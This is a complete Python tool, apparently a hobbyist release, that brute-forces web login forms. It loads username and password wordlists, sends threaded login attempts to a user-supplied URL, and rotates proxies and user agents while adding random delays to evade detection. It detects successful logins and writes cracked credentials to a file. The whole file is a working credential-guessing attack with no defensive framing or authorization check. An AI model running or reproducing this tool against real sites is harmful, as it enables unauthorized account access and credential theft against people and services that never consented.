import requests
import time
import random
import threading
from collections import deque
import json
import os
import sys

# === 🛡️ AnshTech Brute Banner ===
BANNER = """
   ___              _       _          _                _       
  / _ \\ _ __  _   _| |_ ___| |__   ___| |_ ___  ___  __| | ___  
 | | | | '_ \\| | | | __/ __| '_ \\ / _ \\ __/ _ \\/ _ \\/ _` |/ _ \\ 
 | |_| | |_) | |_| | || (__| | | |  __/ ||  __/  __/ (_| | (_) |
  \\___/| .__/ \\__,_|\\__\\___|_| |_|\\___|\\__\\___|\\___|\\__,_|\\___/ 
       |_|                [ Created by Anshul @ AnshTech ]
"""

# === 📁 Configuration Manager ===
class ConfigManager:
    @staticmethod
    def save_config(config, filename="brute_config.json"):
        with open(filename, 'w') as f:
            json.dump(config, f)
    
    @staticmethod
    def load_config(filename="brute_config.json"):
        try:
            with open(filename, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            return None

# === 🛠️ Advanced Brute Force Engine ===
class BruteForcer:
    def __init__(self, config):
        self.config = config
        self.lock = threading.Lock()
        self.proxy_rotation = deque(config.get('proxies', []))
        self.user_agents = deque(config.get('user_agents', [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            'Mozilla/5.0 (Linux; Android 10; SM-G980F)'
        ]))
        self.found = False
        self.attempts = 0
        self.start_time = time.time()
        self.resume_file = "progress.resume"

        # Load wordlists
        self.usernames = self.load_wordlist(config['username_file'])
        self.password_list = self.load_wordlist(config['password_file'])

        # Resume functionality
        if config.get('resume'):
            self.load_progress()

    def load_wordlist(self, filepath):
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return deque(line.strip() for line in f if line.strip())
        except FileNotFoundError:
            print(f"❌ File not found: {filepath}")
            exit(1)

    def save_progress(self):
        with open(self.resume_file, 'w') as f:
            json.dump({
                'usernames': list(self.usernames),
                'attempts': self.attempts
            }, f)

    def load_progress(self):
        if os.path.exists(self.resume_file):
            with open(self.resume_file, 'r') as f:
                progress = json.load(f)
                self.usernames = deque(progress['usernames'])
                self.attempts = progress.get('attempts', 0)

    def get_proxy(self):
        if self.proxy_rotation:
            return {'http': self.proxy_rotation[0], 'https': self.proxy_rotation[0]}
        return None

    def rotate_proxy(self):
        if self.proxy_rotation:
            self.proxy_rotation.rotate(-1)

    def get_user_agent(self):
        if self.user_agents:
            self.user_agents.rotate(-1)
            return self.user_agents[0]
        return 'BruteForcer/2.0'

    def test_connection(self):
        try:
            response = requests.get(
                self.config['url'],
                proxies=self.get_proxy(),
                verify=self.config.get('verify_ssl', True),
                timeout=10
            )
            return True
        except Exception as e:
            print(f"❌ Connection test failed: {e}")
            return False

    def make_request(self, username, password):
        try:
            headers = {'User-Agent': self.get_user_agent()}
            headers.update(self.config.get('headers', {}))

            req_args = {
                'headers': headers,
                'proxies': self.get_proxy(),
                'timeout': self.config.get('timeout', 10),
                'verify': self.config.get('verify_ssl', True),
                'allow_redirects': self.config.get('allow_redirects', True)
            }

            if self.config['method'].upper() == 'POST':
                response = requests.post(self.config['url'],
                                         data={**self.config['data'],
                                               self.config['username_field']: username,
                                               self.config['password_field']: password},
                                         **req_args)
            else:
                params = {**self.config.get('params', {}),
                          self.config['username_field']: username,
                          self.config['password_field']: password}
                response = requests.get(self.config['url'],
                                        params=params,
                                        **req_args)

            self.attempts += 1
            if self.config.get('verbose'):
                print(f"[{response.status_code}] Trying {username}:{password}")
            return response

        except requests.RequestException as e:
            if self.config.get('verbose'):
                print(f"⚠️ Request error: {e}")
            return None

    def check_success(self, response):
        if response is None:
            return False

        if self.config.get('success_indicator') == 'status_code':
            return response.status_code in self.config.get('success_codes', [200])
        elif self.config.get('success_indicator') == 'redirect':
            return response.history and len(response.history) > 0
        else:
            return any(indicator in response.text for indicator in self.config.get('success_strings', []))

    def report_stats(self):
        elapsed = time.time() - self.start_time
        rate = self.attempts / elapsed if elapsed > 0 else 0
        print(f"\n📊 Stats: Attempts={self.attempts} | Time={elapsed:.2f}s | Rate={rate:.2f} req/s")

    def worker(self):
        while not self.found and self.usernames:
            with self.lock:
                if not self.usernames:
                    return
                username = self.usernames.popleft()

            for password in self.password_list:
                if self.found:
                    return

                response = self.make_request(username, password)
                delay = self.config.get('delay', 0.5) + random.uniform(-0.1, 0.3)
                time.sleep(max(delay, 0.1))

                if response and self.check_success(response):
                    with self.lock:
                        self.found = True
                        print(f"\n✅ Success! Credentials: {username}:{password}")
                        if self.config.get('save_results'):
                            with open('success.txt', 'a') as f:
                                f.write(f"{username}:{password}\n")
                        return

                if self.config.get('save_progress'):
                    self.save_progress()

    def start(self):
        if not self.test_connection():
            print("❌ Initial connection test failed. Check URL/proxy settings.")
            return

        print(f"\n🔥 Starting attack with {self.config.get('threads', 5)} threads...")
        threads = []
        for _ in range(self.config.get('threads', 5)):
            t = threading.Thread(target=self.worker)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if not self.found:
            print("\n❌ No valid credentials found.")
        self.report_stats()

# === 🧠 Interactive Input Function ===
def get_input(prompt, default=None, input_type=str):
    while True:
        try:
            user_input = input(f"{prompt} [{default}]: " if default else f"{prompt}: ")
            if not user_input and default is not None:
                return default
            return input_type(user_input)
        except ValueError:
            print("Invalid input. Please try again.")

# === 🖥️ Main Menu ===
def main_menu():
    print(BANNER)

    config = {
        'url': get_input("Enter target login URL"),
        'username_file': get_input("Enter path to usernames wordlist"),
        'password_file': get_input("Enter path to passwords wordlist"),
        'method': get_input("HTTP method (GET/POST)", "POST").upper(),
        'username_field': get_input("Username form field name", "username"),
        'password_field': get_input("Password form field name", "password"),
        'threads': get_input("Number of threads to use", 5, int),
        'delay': get_input("Delay between requests (seconds)", 0.5, float),
        'verify_ssl': get_input("Verify SSL certificates? (yes/no)", "no").lower() == 'yes',
        'save_results': get_input("Save successful results? (yes/no)", "yes").lower() == 'yes',
        'save_progress': get_input("Save progress for resuming? (yes/no)", "yes").lower() == 'yes',
        'verbose': get_input("Enable verbose output? (yes/no)", "no").lower() == 'yes',
        'data': {},
        'params': {}
    }

    print("\n=== Advanced Configuration ===")
    if get_input("Configure success detection? (yes/no)", "no").lower() == 'yes':
        config['success_indicator'] = get_input(
            "Success detection method (status_code/redirect/content)",
            "content"
        )
        if config['success_indicator'] == 'status_code':
            codes = get_input("Enter success status codes (comma separated)", "200")
            config['success_codes'] = [int(c.strip()) for c in codes.split(',')]
        elif config['success_indicator'] == 'content':
            strings = get_input("Enter success strings (comma separated)", "Welcome,Login successful")
            config['success_strings'] = [s.strip() for s in strings.split(',')]

    if get_input("Add custom headers? (yes/no)", "no").lower() == 'yes':
        headers = {}
        while True:
            header = get_input("Enter header (name:value) or 'done' to finish")
            if header.lower() == 'done':
                break
            if ':' in header:
                name, value = header.split(':', 1)
                headers[name.strip()] = value.strip()
        config['headers'] = headers

    if get_input("Add proxy list? (yes/no)", "no").lower() == 'yes':
        proxies = []
        while True:
            proxy = get_input("Enter proxy (http://ip:port) or 'done' to finish")
            if proxy.lower() == 'done':
                break
            proxies.append(proxy)
        config['proxies'] = proxies

    if get_input("Load from saved config? (yes/no)", "no").lower() == 'yes':
        config_file = get_input("Enter config file path", "brute_config.json")
        saved_config = ConfigManager.load_config(config_file)
        if saved_config:
            config.update(saved_config)

    if get_input("Save this configuration? (yes/no)", "no").lower() == 'yes':
        ConfigManager.save_config(config)

    return config

# === 🎬 Run ===
if __name__ == "__main__":
    config = main_menu()
    brute_force = BruteForcer(config)
    brute_force.start()
